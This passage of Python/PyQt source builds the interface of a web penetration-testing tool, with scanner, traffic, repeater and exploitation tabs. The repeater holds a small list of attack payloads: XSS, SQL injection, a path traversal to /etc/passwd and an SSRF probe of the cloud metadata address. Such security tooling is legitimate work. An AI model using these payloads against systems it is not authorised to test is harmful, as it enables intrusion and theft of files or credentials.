        self.vulns.append(vuln)
        row = self.rowCount()
        self.insertRow(row)
        self.setRowHeight(row, 26)
        color = SEVERITY.get(vuln.severity, "#cccccc")

        def cell(text, c=None, bold=False):
            item = QTableWidgetItem(str(text))
            item.setForeground(QColor(c or "#c8d8e8"))
            if bold:
                f = item.font()
                f.setBold(True)
                item.setFont(f)
            return item

        sev_item = cell(vuln.severity, color, bold=True)
        sev_item.setTextAlignment(Qt.AlignCenter | Qt.AlignVCenter)
        self.setItem(row, 0, sev_item)
        self.setItem(row, 1, cell(vuln.vuln_type, "#d0a870"))
        self.setItem(row, 2, cell(vuln.url))
        self.setItem(row, 3, cell(vuln.parameter, "#88aacc"))
        self.setItem(row, 4, cell(vuln.description, "#a0b8a0"))

        # Color row background by severity
        bg = {
            "CRITICAL": QColor("#2a0a0a"),
            "HIGH":     QColor("#251008"),
            "MEDIUM":   QColor("#1e1608"),
            "LOW":      QColor("#08181e"),
            "INFO":     QColor("#081808"),
        }.get(vuln.severity, QColor("#0d1220"))
        for col in range(self.columnCount()):
            item = self.item(row, col)
            if item:
                item.setBackground(bg)
        self.scrollToBottom()

    def selected_vuln(self):
        row = self.currentRow()
        if 0 <= row < len(self.vulns):
            return self.vulns[row]
        return None

    def _context_menu(self, pos):
        vuln = self.selected_vuln()
        menu = QMenu(self)
        if vuln:
            a1 = menu.addAction("⚡  Send to Exploitation Tab")
            a2 = menu.addAction("📋  Copy Details")
            menu.addSeparator()
            a3 = menu.addAction("✓  Mark as Confirmed")
            a4 = menu.addAction("✗  Mark as False Positive")
            chosen = menu.exec_(self.viewport().mapToGlobal(pos))
            if chosen == a1:
                self.sig_send_to_exploit.emit(vuln)
            elif chosen == a2:
                txt = f"{vuln.severity} | {vuln.vuln_type} | {vuln.url}?{vuln.parameter}={vuln.payload}"
                QApplication.clipboard().setText(txt)
            elif chosen == a3:
                vuln.confirmed = True
                for col in range(self.columnCount()):
                    item = self.item(self.currentRow(), col)
                    if item:
                        item.setBackground(QColor("#0a2a12"))
            elif chosen == a4:
                for col in range(self.columnCount()):
                    item = self.item(self.currentRow(), col)
                    if item:
                        item.setForeground(QColor("#444444"))


# ─── REQUEST/RESPONSE EDITOR ─────────────────────────────────────────────────
class RequestResponsePanel(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self._build_ui()

    def _build_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(4)

        splitter = QSplitter(Qt.Horizontal)

        # Request side
        req_widget = QWidget()
        req_layout = QVBoxLayout(req_widget)
        req_layout.setContentsMargins(4, 4, 4, 4)
        req_layout.setSpacing(4)
        req_label = QLabel("◀  REQUEST")
        req_label.setObjectName("sectionLabel")
        req_layout.addWidget(req_label)
        self.req_editor = QTextEdit()
        self.req_editor.setPlaceholderText("HTTP request will appear here...\nRight-click traffic entries to load.")
        HttpHighlighter(self.req_editor.document())
        req_layout.addWidget(self.req_editor)

        # Response side with tabs (raw / rendered)
        resp_widget = QWidget()
        resp_layout = QVBoxLayout(resp_widget)
        resp_layout.setContentsMargins(4, 4, 4, 4)
        resp_layout.setSpacing(4)
        resp_label = QLabel("▶  RESPONSE")
        resp_label.setObjectName("sectionLabel")
        resp_layout.addWidget(resp_label)

        self.resp_tabs = QTabWidget()
        self.resp_raw = QTextEdit()
        self.resp_raw.setReadOnly(True)
        HttpHighlighter(self.resp_raw.document())
        self.resp_render = QWebEngineView()
        self.resp_render.setUrl(QUrl("about:blank"))
        self.resp_tabs.addTab(self.resp_raw, "RAW")
        self.resp_tabs.addTab(self.resp_render, "RENDER")
        resp_layout.addWidget(self.resp_tabs)

        splitter.addWidget(req_widget)
        splitter.addWidget(resp_widget)
        splitter.setSizes([1, 1])
        layout.addWidget(splitter)

    def load_entry(self, entry: HttpEntry):
        self.req_editor.setPlainText(entry.format_request())
        self.resp_raw.setPlainText(entry.format_response())
        ct = entry.content_type
        if "html" in ct:
            self.resp_render.setHtml(entry.response_body or "")
        elif "json" in ct:
            try:
                pretty = json.dumps(json.loads(entry.response_body), indent=2)
                self.resp_render.setHtml(f"<pre style='background:#080c18;color:#a0c880;font-family:monospace;padding:10px'>{pretty}</pre>")
            except Exception:
                self.resp_render.setHtml(f"<pre>{entry.response_body}</pre>")
        else:
            self.resp_render.setHtml(f"<pre style='background:#080c18;color:#a0c880;font-family:monospace;padding:10px'>{entry.response_body}</pre>")


# ─── TRAFFIC TAB ─────────────────────────────────────────────────────────────
class TrafficTab(QWidget):
    sig_send_to_repeater = pyqtSignal(object)

    def __init__(self, parent=None):
        super().__init__(parent)
        self._build_ui()

    def _build_ui(self):
        main_layout = QVBoxLayout(self)
        main_layout.setContentsMargins(6, 6, 6, 6)
        main_layout.setSpacing(6)

        # Filter bar
        filter_bar = QHBoxLayout()
        filter_bar.addWidget(QLabel("FILTER:"))
        self.filter_input = QLineEdit()
        self.filter_input.setPlaceholderText("Filter by URL, method, status...")
        self.filter_input.textChanged.connect(self._apply_filter)
        filter_bar.addWidget(self.filter_input)
        filter_bar.addWidget(QLabel("Method:"))
        self.method_filter = QComboBox()
        self.method_filter.addItems(["ALL", "GET", "POST", "PUT", "DELETE", "PATCH"])
        self.method_filter.currentTextChanged.connect(self._apply_filter)
        filter_bar.addWidget(self.method_filter)
        filter_bar.addWidget(QLabel("Status:"))
        self.status_filter = QComboBox()
        self.status_filter.addItems(["ALL", "2xx", "3xx", "4xx", "5xx"])
        self.status_filter.currentTextChanged.connect(self._apply_filter)
        filter_bar.addWidget(self.status_filter)
        clear_btn = QPushButton("CLEAR")
        clear_btn.clicked.connect(self._clear_traffic)
        filter_bar.addWidget(clear_btn)
        main_layout.addLayout(filter_bar)

        splitter = QSplitter(Qt.Vertical)

        # Traffic table
        table_widget = QWidget()
        tl = QVBoxLayout(table_widget)
        tl.setContentsMargins(0, 0, 0, 0)
        section = QLabel("HTTP TRAFFIC  —  right-click to send to Repeater")
        section.setObjectName("sectionLabel")
        tl.addWidget(section)
        self.traffic_table = HttpTrafficTable()
        self.traffic_table.sig_send_to_repeater.connect(self.sig_send_to_repeater)
        self.traffic_table.itemSelectionChanged.connect(self._on_row_select)
        tl.addWidget(self.traffic_table)
        splitter.addWidget(table_widget)

        # Request/Response panel
        self.rr_panel = RequestResponsePanel()
        splitter.addWidget(self.rr_panel)
        splitter.setSizes([350, 300])

        main_layout.addWidget(splitter)

    def add_entry(self, entry):
        self.traffic_table.add_entry(entry)

    def _on_row_select(self):
        entry = self.traffic_table.selected_entry()
        if entry:
            self.rr_panel.load_entry(entry)

    def _apply_filter(self):
        text = self.filter_input.text().lower()
        method = self.method_filter.currentText()
        status_filter = self.status_filter.currentText()
        for row in range(self.traffic_table.rowCount()):
            if row >= len(self.traffic_table.entries):
                break
            e = self.traffic_table.entries[row]
            show = True
            if text and text not in (e.url + str(e.status)).lower():
                show = False
            if method != "ALL" and e.method != method:
                show = False
            if status_filter != "ALL" and e.status:
                prefix = int(status_filter[0])
                if e.status // 100 != prefix:
                    show = False
            self.traffic_table.setRowHidden(row, not show)

    def _clear_traffic(self):
        self.traffic_table.setRowCount(0)
        self.traffic_table.entries.clear()


# ─── SCANNER TAB ─────────────────────────────────────────────────────────────
class ScannerTab(QWidget):
    sig_http_entry = pyqtSignal(object)
    sig_vuln       = pyqtSignal(object)

    def __init__(self, parent=None):
        super().__init__(parent)
        self.worker = None
        self._build_ui()

    def _build_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(8, 8, 8, 8)
        layout.setSpacing(8)

        # Target config
        tgt_group = QGroupBox("TARGET CONFIGURATION")
        tgt_layout = QFormLayout(tgt_group)
        tgt_layout.setSpacing(8)
        self.url_input = QLineEdit("https://example.com")
        tgt_layout.addRow("Target URL:", self.url_input)
        self.depth_spin = QSpinBox()
        self.depth_spin.setRange(1, 10)
        self.depth_spin.setValue(3)
        tgt_layout.addRow("Crawl Depth:", self.depth_spin)
        self.threads_spin = QSpinBox()
        self.threads_spin.setRange(1, 20)
        self.threads_spin.setValue(5)
        tgt_layout.addRow("Threads:", self.threads_spin)
        layout.addWidget(tgt_group)

        # Scan options
        opts_group = QGroupBox("SCAN MODULES")
        opts_layout = QHBoxLayout(opts_group)
        opts_layout.setSpacing(16)
        self.cb_crawl   = QCheckBox("Web Crawler")       ; self.cb_crawl.setChecked(True)
        self.cb_xss     = QCheckBox("XSS Detection")     ; self.cb_xss.setChecked(True)
        self.cb_sqli    = QCheckBox("SQL Injection")      ; self.cb_sqli.setChecked(True)
        self.cb_headers = QCheckBox("Security Headers")   ; self.cb_headers.setChecked(True)
        self.cb_csrf    = QCheckBox("CSRF Detection")     ; self.cb_csrf.setChecked(True)
        self.cb_ssrf    = QCheckBox("SSRF/XXE")           ; self.cb_ssrf.setChecked(True)
        self.cb_idor    = QCheckBox("IDOR/Path Traversal"); self.cb_idor.setChecked(True)
        for cb in [self.cb_crawl, self.cb_xss, self.cb_sqli,
                   self.cb_headers, self.cb_csrf, self.cb_ssrf, self.cb_idor]:
            opts_layout.addWidget(cb)
        opts_layout.addStretch()
        layout.addWidget(opts_group)

        # Controls
        ctrl_row = QHBoxLayout()
        self.btn_scan = QPushButton("▶  START SCAN")
        self.btn_scan.setObjectName("btnSuccess")
        self.btn_scan.clicked.connect(self.start_scan)
        self.btn_stop = QPushButton("■  STOP")
        self.btn_stop.setObjectName("btnDanger")
        self.btn_stop.setEnabled(False)
        self.btn_stop.clicked.connect(self.stop_scan)
        self.progress = QProgressBar()
        self.progress.setValue(0)
        self.progress_label = QLabel("IDLE")
        self.progress_label.setMinimumWidth(200)
        ctrl_row.addWidget(self.btn_scan)
        ctrl_row.addWidget(self.btn_stop)
        ctrl_row.addWidget(self.progress, 1)
        ctrl_row.addWidget(self.progress_label)
        layout.addLayout(ctrl_row)

        # Stats bar
        stats_row = QHBoxLayout()
        self.stat_requests = self._stat_box("REQUESTS", "0")
        self.stat_vulns    = self._stat_box("VULNERABILITIES", "0")
        self.stat_critical = self._stat_box("CRITICAL", "0")
        self.stat_high     = self._stat_box("HIGH", "0")
        self.stat_medium   = self._stat_box("MEDIUM", "0")
        for box in [self.stat_requests, self.stat_vulns, self.stat_critical, self.stat_high, self.stat_medium]:
            stats_row.addWidget(box)
        stats_row.addStretch()
        layout.addLayout(stats_row)

        # Log
        log_label = QLabel("SCAN LOG")
        log_label.setObjectName("sectionLabel")
        layout.addWidget(log_label)
        self.log = QTextEdit()
        self.log.setReadOnly(True)
        self.log.document().setMaximumBlockCount(1000)
        layout.addWidget(self.log, 1)

        self._req_count = 0
        self._vuln_counts = {}

    def _stat_box(self, label, value):
        frame = QFrame()
        frame.setFrameShape(QFrame.StyledPanel)
        frame.setStyleSheet("QFrame { border: 1px solid #1e3a5f; border-radius: 3px; padding: 4px 8px; }")
        fl = QVBoxLayout(frame)
        fl.setContentsMargins(6, 4, 6, 4)
        fl.setSpacing(2)
        lbl = QLabel(label)
        lbl.setStyleSheet("color: #4a7a9a; font-size: 9px; letter-spacing: 2px;")
        val = QLabel(value)
        val.setStyleSheet("color: #00d4ff; font-size: 18px; font-weight: bold;")
        fl.addWidget(lbl)
        fl.addWidget(val)
        frame._val_label = val
        return frame

    def _update_stat(self, frame, value):
        frame._val_label.setText(str(value))

    def start_scan(self):
        url = self.url_input.text().strip()
        if not url:
            self.log.append('<span style="color:#ff4040">✗ No target URL specified.</span>')
            return
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
            self.url_input.setText(url)

        self.log.clear()
        self.progress.setValue(0)
        self._req_count = 0
        self._vuln_counts = {}
        for box in [self.stat_requests, self.stat_vulns, self.stat_critical, self.stat_high, self.stat_medium]:
            self._update_stat(box, 0)

        options = {
            "vuln_scan": True,
            "depth": self.depth_spin.value(),
            "threads": self.threads_spin.value(),
            "modules": {
                "xss": self.cb_xss.isChecked(),
                "sqli": self.cb_sqli.isChecked(),
                "headers": self.cb_headers.isChecked(),
                "csrf": self.cb_csrf.isChecked(),
                "ssrf": self.cb_ssrf.isChecked(),
                "idor": self.cb_idor.isChecked(),
            }
        }
        self.worker = ScanWorker(url, options)
        self.worker.sig_progress.connect(self._on_progress, Qt.QueuedConnection)
        self.worker.sig_http_entry.connect(self._on_http, Qt.QueuedConnection)
        self.worker.sig_vuln.connect(self._on_vuln, Qt.QueuedConnection)
        self.worker.sig_log.connect(self._on_log, Qt.QueuedConnection)
        self.worker.sig_done.connect(self._on_done, Qt.QueuedConnection)
        self.worker.start()
        self.btn_scan.setEnabled(False)
        self.btn_stop.setEnabled(True)

    def stop_scan(self):
        if self.worker:
            self.worker.stop()
        self.btn_scan.setEnabled(True)
        self.btn_stop.setEnabled(False)
        self._on_log("Scan stopped by user.", "warning")

    @pyqtSlot(int, str)
    def _on_progress(self, pct, msg):
        self.progress.setValue(pct)
        self.progress_label.setText(msg)

    @pyqtSlot(object)
    def _on_http(self, entry):
        self._req_count += 1
        self._update_stat(self.stat_requests, self._req_count)
        self.sig_http_entry.emit(entry)

    @pyqtSlot(object)
    def _on_vuln(self, vuln):
        self._vuln_counts[vuln.severity] = self._vuln_counts.get(vuln.severity, 0) + 1
        total = sum(self._vuln_counts.values())
        self._update_stat(self.stat_vulns, total)
        self._update_stat(self.stat_critical, self._vuln_counts.get("CRITICAL", 0))
        self._update_stat(self.stat_high, self._vuln_counts.get("HIGH", 0))
        self._update_stat(self.stat_medium, self._vuln_counts.get("MEDIUM", 0))
        self.sig_vuln.emit(vuln)

    @pyqtSlot(str, str)
    def _on_log(self, msg, level):
        colors = {
            "info":    "#7ab8d4",
            "success": "#50cc80",
            "warning": "#ffaa30",
            "error":   "#ff5050",
        }
        color = colors.get(level, "#c8d8e8")
        ts = datetime.now().strftime("%H:%M:%S")
        msg_esc = msg.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        self.log.append(f'<span style="color:#334455">[{ts}]</span> <span style="color:{color}">{msg_esc}</span>')

    @pyqtSlot(str)
    def _on_done(self, summary):
        self.btn_scan.setEnabled(True)
        self.btn_stop.setEnabled(False)
        self._on_log(f"✓ {summary}", "success")


# ─── VULNERABILITY TAB ───────────────────────────────────────────────────────
class VulnTab(QWidget):
    sig_send_to_exploit = pyqtSignal(object)

    def __init__(self, parent=None):
        super().__init__(parent)
        self._build_ui()

    def _build_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(6, 6, 6, 6)
        layout.setSpacing(6)

        # Summary bar
        self.summary_bar = QLabel("No vulnerabilities found yet. Run a scan first.")
        self.summary_bar.setStyleSheet("color:#4a7a9a; padding:4px 0;")
        layout.addWidget(self.summary_bar)

        splitter = QSplitter(Qt.Vertical)

        # Vuln table
        vt_widget = QWidget()
        vtl = QVBoxLayout(vt_widget)
        vtl.setContentsMargins(0, 0, 0, 0)
        sec_lbl = QLabel("VULNERABILITIES  —  right-click to exploit")
        sec_lbl.setObjectName("sectionLabel")
        vtl.addWidget(sec_lbl)
        self.vuln_table = VulnTable()
        self.vuln_table.sig_send_to_exploit.connect(self.sig_send_to_exploit)
        self.vuln_table.itemSelectionChanged.connect(self._on_select)
        vtl.addWidget(self.vuln_table)
        splitter.addWidget(vt_widget)

        # Detail panel
        detail_widget = QWidget()
        dl = QVBoxLayout(detail_widget)
        dl.setContentsMargins(0, 0, 0, 0)
        dl.setSpacing(4)
        detail_lbl = QLabel("VULNERABILITY DETAILS")
        detail_lbl.setMaximumHeight(40)
        detail_lbl.setObjectName("sectionLabel")
        dl.addWidget(detail_lbl)

        detail_split = QSplitter(Qt.Horizontal)
        self.detail_left = QTextEdit()
        self.detail_left.setReadOnly(True)
        self.detail_right = QTextEdit()
        self.detail_right.setReadOnly(True)
        detail_split.addWidget(self.detail_left)
        detail_split.addWidget(self.detail_right)
        dl.addWidget(detail_split)

        btn_row = QHBoxLayout()
        self.btn_exploit = QPushButton("⚡  SEND TO EXPLOIT")
        self.btn_exploit.setObjectName("btnDanger")
        self.btn_exploit.setEnabled(False)
        self.btn_exploit.clicked.connect(self._exploit_selected)
        btn_row.addWidget(self.btn_exploit)
        btn_row.addStretch()
        dl.addLayout(btn_row)
        splitter.addWidget(detail_widget)
        splitter.setSizes([300, 250])
        layout.addWidget(splitter)

        self._vulns = []

    def add_vuln(self, vuln: VulnEntry):
        self._vulns.append(vuln)
        self.vuln_table.add_vuln(vuln)
        counts = {}
        for v in self._vulns:
            counts[v.severity] = counts.get(v.severity, 0) + 1
        parts = [f'<span style="color:{SEVERITY[s]}">{s}: {n}</span>'
                 for s, n in sorted(counts.items())]
        self.summary_bar.setText(
            f'Total: <b style="color:#00d4ff">{len(self._vulns)}</b>  —  ' + "  ".join(parts)
        )

    def _on_select(self):
        vuln = self.vuln_table.selected_vuln()
        if not vuln:
            return
        color = SEVERITY.get(vuln.severity, "#cccccc")
        left = (
            f"Type        : {vuln.vuln_type}\n"
            f"Severity    : {vuln.severity}\n"
            f"URL         : {vuln.url}\n"
            f"Parameter   : {vuln.parameter}\n\n"
            f"Description :\n{vuln.description}\n\n"
            f"Payload     :\n{vuln.payload or '(none)'}\n\n"
            f"Timestamp   : {vuln.timestamp.strftime('%Y-%m-%d %H:%M:%S')}"
        )
        right = f"EVIDENCE:\n\n{vuln.evidence}\n\n---\nCONFIRMED: {vuln.confirmed}"
        self.detail_left.setPlainText(left)
        self.detail_right.setPlainText(right)
        self.btn_exploit.setEnabled(True)

    def _exploit_selected(self):
        vuln = self.vuln_table.selected_vuln()
        if vuln:
            self.sig_send_to_exploit.emit(vuln)


# ─── REPEATER REQUEST WORKER ─────────────────────────────────────────────────
class RepeaterRequestWorker(QThread):
    sig_result = pyqtSignal(str, str, str)   # raw, body_html, status_line
    sig_error  = pyqtSignal(str)

    def __init__(self, method, url, headers=None, body=""):
        super().__init__()
        self.method = method
        self.url = url
        self.headers = headers or {}
        self.body = body

    def run(self):
        if HAS_REQUESTS:
            try:
                import urllib3
                urllib3.disable_warnings()
                t0 = time.time()
                resp = requests.request(
                    self.method, self.url,
                    headers=self.headers or None,
                    data=self.body or None,
                    timeout=15, verify=False, allow_redirects=True
                )
                elapsed = int((time.time() - t0) * 1000)

                raw = f"HTTP/1.1 {resp.status_code} {resp.reason}\n"
                for k, v in resp.headers.items():
                    raw += f"{k}: {v}\n"
                raw += "\n" + resp.text[:12000]
                if len(resp.text) > 12000:
                    raw += f"\n\n... [{len(resp.text) - 12000} more bytes truncated] ..."

                ct = resp.headers.get("Content-Type", "")
                body_html = ""
                if "html" in ct:
                    body_html = resp.text
                elif "json" in ct:
                    try:
                        pretty = json.dumps(resp.json(), indent=2)
                        body_html = (
                            "<pre style='background:#080c18;color:#a0c880;"
                            "font-family:monospace;padding:10px'>"
                            + pretty.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")
                            + "</pre>"
                        )
                    except Exception:
                        body_html = f"<pre>{resp.text[:4000]}</pre>"

                status_line = (
                    f"← {resp.status_code} {resp.reason}  |  "
                    f"{elapsed}ms  |  {len(resp.content):,} bytes  |  {ct.split(';')[0]}"
                )
                self.sig_result.emit(raw, body_html, status_line)
            except Exception as e:
                self.sig_error.emit(f"Request failed:\n{type(e).__name__}: {e}")
        else:
            # Simulate when requests is not installed
            time.sleep(0.15)
            fake_body = (
                "<html><body style='background:#080c18;color:#a0c880;font-family:monospace'>"
                "<h2>Simulated Response</h2>"
                "<p>Install the <b>requests</b> library for live HTTP:</p>"
                "<pre>pip install requests</pre></body></html>"
            )
            raw = (
                "HTTP/1.1 200 OK\n"
                "Content-Type: text/html\n"
                "X-Simulated: true\n\n"
                + fake_body
            )
            self.sig_result.emit(
                raw, fake_body,
                "← SIMULATED 200 OK  |  pip install requests for live HTTP"
            )


# ─── MANUAL REPEATER TAB ─────────────────────────────────────────────────────
class RepeaterTab(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self._build_ui()

    def _build_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(8, 8, 8, 8)
        layout.setSpacing(8)

        # URL bar
        url_row = QHBoxLayout()
        self.method_combo = QComboBox()
        self.method_combo.addItems(["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"])
        self.url_bar = QLineEdit()
        self.url_bar.setPlaceholderText("https://example.com/api/endpoint")
        self.btn_send = QPushButton("▶  SEND")
        self.btn_send.setObjectName("btnSuccess")
        self.btn_send.clicked.connect(self._send_request)
        url_row.addWidget(self.method_combo)
        url_row.addWidget(self.url_bar, 1)
        url_row.addWidget(self.btn_send)
        layout.addLayout(url_row)

        splitter = QSplitter(Qt.Horizontal)

        # Request editor
        req_widget = QWidget()
        req_widget.setMaximumWidth(650)
        rl = QVBoxLayout(req_widget)
        rl.setContentsMargins(0, 0, 0, 0)
        rl.setSpacing(4)

        req_lbl = QLabel("◀  REQUEST  (edit & send)")
        req_lbl.setObjectName("sectionLabel")


        rl.addWidget(req_lbl)
        self.req_editor = QTextEdit()
        self.req_editor.setPlaceholderText(
            "GET /path HTTP/1.1\nHost: example.com\nUser-Agent: WebSecPro/1.0\n\n"
        )
        HttpHighlighter(self.req_editor.document())
        rl.addWidget(self.req_editor)

        # Quick payload buttons
        payload_row = QHBoxLayout()
        payload_row.addWidget(QLabel("PAYLOADS:"))
        payloads = [
            ("XSS Basic", "<script>alert(1)</script>"),
            ("SQLi Error", "' OR '1'='1"),
            ("SQLi UNION", "' UNION SELECT NULL,NULL--"),
            ("Path Trav.", "../../../etc/passwd"),
            ("SSRF AWS", "http://169.254.169.254/"),
        ]
        for name, payload in payloads:
            btn = QPushButton(name)
            btn.setFixedHeight(26)
            btn.clicked.connect(lambda checked, p=payload: self._insert_payload(p))
            payload_row.addWidget(btn)
        payload_row.addStretch()
        rl.addLayout(payload_row)
        splitter.addWidget(req_widget)

        # Response panel
        resp_widget = QWidget()
        rpl = QVBoxLayout(resp_widget)
        rpl.setContentsMargins(0, 0, 0, 0)
        rpl.setSpacing(4)
        resp_lbl = QLabel("▶  RESPONSE")
        resp_lbl.setObjectName("sectionLabel")
        rpl.addWidget(resp_lbl)

        self.resp_tabs = QTabWidget()
        self.resp_raw = QTextEdit()
        self.resp_raw.setReadOnly(True)
        HttpHighlighter(self.resp_raw.document())
        self.resp_render = QWebEngineView()
        self.resp_tabs.addTab(self.resp_raw, "RAW")
        self.resp_tabs.addTab(self.resp_render, "RENDER")
        rpl.addWidget(self.resp_tabs)

        self.resp_status_bar = QLabel("Ready — press SEND to fire request")
        self.resp_status_bar.setStyleSheet("color:#4a7a9a; font-size: 11px;")
        rpl.addWidget(self.resp_status_bar)
        splitter.addWidget(resp_widget)
        splitter.setSizes([1, 1])
        layout.addWidget(splitter)

    def load_entry(self, entry: HttpEntry):
        self.method_combo.setCurrentText(entry.method)
        self.url_bar.setText(entry.url)
        self.req_editor.setPlainText(entry.format_request())
        self.resp_raw.setPlainText(entry.format_response())
        self.resp_status_bar.setText(
            f"Loaded from traffic — Status {entry.status} — {entry.response_time}ms"
        )

    def _insert_payload(self, payload):
        cursor = self.req_editor.textCursor()
        cursor.insertText(payload)

    def _send_request(self):
        url = self.url_bar.text().strip()
        method = self.method_combo.currentText()
        if not url:
            return
        self.resp_status_bar.setText(f"Sending {method} {url}...")
        self.btn_send.setEnabled(False)

        self._req_worker = RepeaterRequestWorker(method, url)
        self._req_worker.sig_result.connect(self._on_response, Qt.QueuedConnection)
        self._req_worker.sig_error.connect(self._on_response_error, Qt.QueuedConnection)
        self._req_worker.start()

    @pyqtSlot(str, str, str)
    def _on_response(self, raw, body_html, status_line):
        self.resp_raw.setPlainText(raw)
        if body_html:
            self.resp_render.setHtml(body_html)
        self.resp_status_bar.setText(status_line)
        self.btn_send.setEnabled(True)

    @pyqtSlot(str)
    def _on_response_error(self, msg):
        self.resp_raw.setPlainText(msg)
        self.resp_status_bar.setText(f"Error — see response panel")
        self.btn_send.setEnabled(True)


# ─── EXPLOITATION TAB ────────────────────────────────────────────────────────
class ExploitTab(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.worker = None
        self.current_vuln = None
        self._build_ui()

    def _build_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(8, 8, 8, 8)
        layout.setSpacing(8)

        # Vuln info header
        self.vuln_header = QLabel("No vulnerability loaded — send one from the Vulnerabilities tab")
        self.vuln_header.setStyleSheet("color:#ffaa30; font-weight:bold; padding: 4px 0;")
        self.vuln_header.setMaximumHeight(100)
        layout.addWidget(self.vuln_header)

        # Config row
        cfg_row = QHBoxLayout()
        cfg_row.addWidget(QLabel("Exploit Mode:"))
        self.mode_combo = QComboBox()
        self.mode_combo.addItems([
            "Auto Exploit", "Payload Fuzzing", "Data Extraction",
            "Privilege Escalation", "Lateral Movement", "Custom"
        ])
        cfg_row.addWidget(self.mode_combo)
        cfg_row.addWidget(QLabel("Delay (ms):"))
        self.delay_spin = QSpinBox()
        self.delay_spin.setRange(0, 5000)
        self.delay_spin.setValue(200)
        cfg_row.addWidget(self.delay_spin)
        self.cb_verbose = QCheckBox("Verbose")
        self.cb_verbose.setChecked(True)
        cfg_row.addWidget(self.cb_verbose)
        cfg_row.addStretch()
        self.btn_run = QPushButton("⚡  RUN EXPLOIT")
        self.btn_run.setObjectName("btnDanger")
        self.btn_run.setEnabled(False)
        self.btn_run.clicked.connect(self.run_exploit)
        self.btn_stop_ex = QPushButton("■  STOP")
        self.btn_stop_ex.setEnabled(False)
        self.btn_stop_ex.clicked.connect(self.stop_exploit)
        cfg_row.addWidget(self.btn_run)
        cfg_row.addWidget(self.btn_stop_ex)
        layout.addLayout(cfg_row)

        main_split = QSplitter(Qt.Horizontal)

        # Left: loaded vulns list
        left_widget = QWidget()
        ll = QVBoxLayout(left_widget)
        ll.setContentsMargins(0, 0, 0, 0)
        ll.setSpacing(4)
        ll.addWidget(QLabel("LOADED TARGETS"))
        self.vuln_list = QListWidget()
        self.vuln_list.itemClicked.connect(self._on_vuln_selected)
        ll.addWidget(self.vuln_list)
        left_widget.setMaximumWidth(260)
        main_split.addWidget(left_widget)

        # Right: output console
        right_widget = QWidget()
        rl = QVBoxLayout(right_widget)
        rl.setContentsMargins(0, 0, 0, 0)
        rl.setSpacing(4)
        rl.addWidget(QLabel("EXPLOIT CONSOLE"))
        self.console = QTextEdit()
        self.console.setReadOnly(True)
        self.console.setStyleSheet(
            "QTextEdit { background-color: #03060f; color: #00ff88; "
            "font-family: 'Consolas','Courier New',monospace; font-size: 12px; }"
        )
        rl.addWidget(self.console)

        # Progress
        self.ex_progress = QProgressBar()
        self.ex_progress.setTextVisible(False)
        rl.addWidget(self.ex_progress)
        main_split.addWidget(right_widget)
        main_split.setSizes([250, 800])
        layout.addWidget(main_split)

        self.vulns = []

    def load_vuln(self, vuln: VulnEntry):
        self.vulns.append(vuln)
        item = QListWidgetItem()
        color = SEVERITY.get(vuln.severity, "#cccccc")
        item.setText(f"[{vuln.severity}] {vuln.vuln_type}")
        item.setForeground(QColor(color))
        item.setData(Qt.UserRole, len(self.vulns) - 1)
        self.vuln_list.addItem(item)
        self.vuln_list.setCurrentItem(item)
        self._load_vuln_at(len(self.vulns) - 1)

    def _on_vuln_selected(self, item):
        idx = item.data(Qt.UserRole)
        self._load_vuln_at(idx)

    def _load_vuln_at(self, idx):
        if 0 <= idx < len(self.vulns):
            self.current_vuln = self.vulns[idx]
            v = self.current_vuln
            color = SEVERITY.get(v.severity, "#cccccc")
            self.vuln_header.setText(
                f'<span style="color:{color}">[{v.severity}]</span>  {v.vuln_type}  '
                f'<span style="color:#7ab8d4">{v.url}</span>  '
                f'<span style="color:#888888">param: {v.parameter}</span>'
            )
            self.btn_run.setEnabled(True)
            self.console.clear()
            self._write("Vulnerability loaded. Press RUN EXPLOIT to begin.", "info")

    def run_exploit(self):
        if not self.current_vuln:
            return
        self.console.clear()
        self.ex_progress.setValue(0)
        self.btn_run.setEnabled(False)
        self.btn_stop_ex.setEnabled(True)

        self.worker = ExploitWorker(self.current_vuln, self.mode_combo.currentText())
        self.worker.sig_output.connect(self._on_output, Qt.QueuedConnection)
        self.worker.sig_done.connect(self._on_done, Qt.QueuedConnection)
        self.worker.start()

        # Animate progress bar
        self._prog_timer = QTimer(self)
        self._prog_timer.timeout.connect(self._tick_progress)
        self._prog_timer.start(150)

    def stop_exploit(self):
        if self.worker:
            self.worker.stop()
        if hasattr(self, '_prog_timer'):
            self._prog_timer.stop()
        self.btn_run.setEnabled(True)
        self.btn_stop_ex.setEnabled(False)
        self._write("Exploit stopped by user.", "fail")

    def _tick_progress(self):
        v = self.ex_progress.value()
        self.ex_progress.setValue(min(v + 2, 99))

    @pyqtSlot(str, str)
    def _on_output(self, text, level):
        colors = {
            "title":          ("#00ffcc", True),
            "info":           ("#7ab8d4", False),
            "step":           ("#ffcc60", False),
            "cmd":            ("#80b880", False),
            "success":        ("#40ee80", True),
            "fail":           ("#888888", False),
            "exploit_success":("#ff4060", True),
            "exploit_fail":   ("#ff8040", False),
            "severity":       ("#ffaa30", True),
            "report":         ("#a8d8a8", False),
        }
        color, bold = colors.get(level, ("#c8d8e8", False))
        text_esc = text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        tag = f'<b style="color:{color}">' if bold else f'<span style="color:{color}">'
        end = "</b>" if bold else "</span>"
        self.console.append(f"{tag}{text_esc}{end}")

    def _write(self, text, level="info"):
        self._on_output(text, level)

    @pyqtSlot(bool, str)
    def _on_done(self, success, summary):
        if hasattr(self, '_prog_timer'):
            self._prog_timer.stop()
        self.ex_progress.setValue(100)
        self.btn_run.setEnabled(True)
        self.btn_stop_ex.setEnabled(False)
        level = "exploit_success" if success else "exploit_fail"
        self._write(f"\n{summary}", level)


# ─── HISTORY TAB ─────────────────────────────────────────────────────────────
class HistoryTab(QWidget):
